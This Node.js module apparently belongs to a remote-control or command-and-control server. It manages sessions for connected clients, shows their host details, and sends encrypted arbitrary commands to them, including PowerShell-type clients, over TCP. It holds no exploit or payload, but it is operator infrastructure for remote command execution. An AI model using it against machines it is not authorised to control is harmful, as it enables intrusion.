const { log, logInfo, logSuccess, logError }  = require('./logging');
const { encryptData }  = require('./encdec');
const { queueCommands } = require('./queue');
const { Socket } = require('node:net');

require('../typedef/definitions');

const activeClients = new Map();

let activeClientSessionId = null; // active client session ID

/**
 * Sets the active client session ID
 * @param {string} sessionId
 * @returns {string}
 */
const setClientActive = (sessionId) => {
    if (!sessionId) {
        activeClientSessionId = null;
        log('The active session ID has been cleared.', undefined);
        return;
    }
    let clientExists = getClient(sessionId);
    if (sessionId && clientExists && sessionId.length === 32) {
        activeClientSessionId = sessionId;
        log(`${activeClientSessionId} is now the active session.`, undefined);
    } else {
        logError('Invalid session ID.');
    }
    return activeClientSessionId;
};

/**
 * Shows the full active client details 
 */
const showClient = () => {
    if (!activeClientSessionId) {
        throw new Error(`You must set a session ID first.`);
    }
    const client = getClient(activeClientSessionId);
    if (!client) {
        throw new Error(`Invalid session ID: ${activeClientSessionId}`);
    }
    log("\nClient Details:", 93);
    log(["Last Seen:\t\t", client.lastSeen], [96, 97]);
    log(["Active:\t\t\t", client.active], [96, 97]);
    log(["Session ID:\t\t", client.sessionId], [96, 97]);
    log(["Hostname:\t\t", client.hostname], [96, 97]);
    log(["IP Address:\t\t", client.address], [96, 97]);
    log(["Type:\t\t\t", client.type], [96, 97]);
    log(["Client Ver:\t\t", client.version], [96, 97]);
    log(["Architecture:\t\t", client.arch], [96, 97]);
    log(["Platform:\t\t", client.platform], [96, 97]);
    log(["OS Ver:\t\t\t", client.osver, "\n"], [96, 97, 97]);
};

/**
 * Shows the clients list
 */
const showActiveClients = () => {
    if (activeClients.size === 0) {
        logInfo('No active clients.');
        return;
    }
    const active = Array.from(activeClients.values()).filter(client => client.active).length;
    logSuccess(`\nClient Sessions (${activeClients.size} Total / ${active} Active):`);
    const colWidths = [36, 15, 20, 10, 10, 10, 10];
    const totalWidth = colWidths.reduce((sum, width) => sum + width, 0) + colWidths.length + 1;
    const pad = (str, len) => str ? str.padEnd(len) : "".padEnd(10);
    logInfo('┌' + '─'.repeat(totalWidth - 2) + '┐');
    logInfo('│' + pad('SessionID', colWidths[0]) + '│' +
                     pad('ClientIP', colWidths[1]) + '│' +
                     pad('Updated', colWidths[2]) + '│' +
                     pad('Online', colWidths[3]) + '│' +
                     pad('Active', colWidths[4]) + '│' +
                     pad('Ver', colWidths[5]) + '│' +
                     pad('Type', colWidths[6]) + '│');
    logInfo('├' + colWidths.map(w => '─'.repeat(w)).join('┼') + '┤');
    for (const [sessionId, client] of activeClients) {
        const datetime = new Date(client.lastSeen);
        const lastSeen = datetime.toLocaleDateString('en-US', {
            weekday: 'short',
            year: 'numeric',
            month: 'short',
            day: 'numeric'
        });
        logInfo('│' + pad(sessionId, colWidths[0]) + '│' +
                         pad(client.address, colWidths[1]) + '│' +
                         pad(lastSeen, colWidths[2]) + '│' +
                         pad(client.active ? 'Yes' : 'No', colWidths[3]) + '│' +
                         pad(client.sessionId === activeClientSessionId ? 'Yes' : 'No', colWidths[4]) + '│' +
                         pad(client.version, colWidths[5]) + '│' +
                         pad(client.type, colWidths[6]) + '│');
    }
    logInfo('└' + colWidths.map(w => '─'.repeat(w)).join('┴') + '┘');
};

/**
 * Execute a client command
 * @param {Client} client 
 * @param {string} command 
 */
const executeClientCommand = async (client, command) => {
    try {
        let cipher = 'aes-256-gcm';
        // powershell needs cbc instead of gcm
        if (client.type === 'ps') {
            cipher = 'aes-256-cbc';
        }
        const payload = await encryptData(command, client.sessionId, cipher);
        if (payload) {
            return new Promise((resolve) => {
                if (client.socket.write(payload) === true) {
                    // wait
                } else {
                    client.socket.once("drain", resolve(true));
                }
            });
        } else {
            throw new Error("Payload invalid.");
        }
    } catch (error) {
        logError(`Exception: ${error.message}`);
    }
};

/**
 * Sends the client command
 * @param {string} command 
 * @param {string[]} args 
 */
const sendClientCommand = async (command, args) => {
    const sessionId = activeClientSessionId || null;
    if (sessionId) {
        const client = getClient(sessionId);
        if (!client) {
            logError(`Invalid client session ID or client not found.`);
            return;
        }
        // Send command to client and wait for response
        await sendCommandToClient(client, command, args);
    } else {
        logInfo(`You must first set an active client sessionID.`);
    }
};

/**
 * Sends a command to a client
 * @param {Client} client
 * @param {string} command 
 * @param {string[]} args 
 */
const sendCommandToClient = async (client, command, args) => {
    if (!client) {
        throw new Error('Invalid client.'); 
    } else if (!command) {
        throw new Error('Missing command.')
    }
    if (client && client.active) {
        await executeClientCommand(client, [command, ...args].join(' '));
    } else {
        await queueCommands(client, command, args)
    }
};

/**
 * Returns the active client session ID
 * @returns string
 */
const getActiveClientSessionId = () => {
    return activeClientSessionId;
};

/**
 * Add client session to active clients
 * @param {string} sessionId 
 * @param {Socket} socket 
 */
const addClientSession = (sessionId, socket) => {
    let client = getClient(sessionId);
    if (!client) {
        const ipAddress = socket.address().address.replace("::ffff:","");
        client = {
            sessionId: sessionId,
            socket: socket,
            address: ipAddress,
            lastSeen: new Date(),
            active: true,
            buffer: null,
            waiting: false,
            version: null,
            type: null,
            platform: null, 
            arch: null, 
            osver: null, 
            hostname: null
        };
    } else {
        client.active = true;
        client.socket = socket;
        client.lastSeen = (new Date()).getDate();
    }
    setClient(sessionId, client);
};

/**
 * Upserts client properties to active clients
 * @param {string} sessionId 
 * @param {Client} payload 
 */
const upsertClientSession = (sessionId, payload) => {
    const client = getClient(sessionId);
    setClient(sessionId, {
        sessionId: payload.sessionId ?? client.sessionId,
        socket: payload.socket ?? client.socket,
        address: payload.address ?? client.address,
        lastSeen: payload.lastSeen ?? client.lastSeen,
        active: payload.active ?? client.active,
        buffer: payload.buffer ?? client.buffer,
        waiting: payload.waiting ?? client.waiting,
        version: payload.version ?? client.version,
        type: payload.type ?? client.type,
        platform: payload.platform ?? client.platform, 
        arch: payload.arch ?? client.arch, 
        osver: payload.osver ?? client.osver, 
        hostname: payload.hostname ?? client.hostname
    });
};

/**
 * Clears the active client session
 */
const clearActiveSession = () => {
    activeClientSessionId = null;
};

/**
 * Returns the client object by session ID
 * @param {string} sessionId 
 * @returns {Client} Client
 */
const getClient = (sessionId) => {
    return activeClients.get(sessionId);
};

/**
 * Adds a new client object with sessionID
 * @param {string} sessionId
 * @param {Client} client
 */
const setClient = (sessionId, client) => {
    return activeClients.set(sessionId, client);
};

/**
 * Ends all client sessions
 */
const endClientSessions = () => {
    for (const [sessionId, client] of activeClients) {
        client.socket.destroy();
        logSuccess(`Client connection ${sessionId} has been closed.`);
    }
};

module.exports = {
    addClientSession,
    clearActiveSession,
    endClientSessions,
    executeClientCommand,
    getActiveClientSessionId,
    getClient,
    sendClientCommand,
    sendCommandToClient,
    setClientActive,
    showActiveClients,
    showClient,
    upsertClientSession
};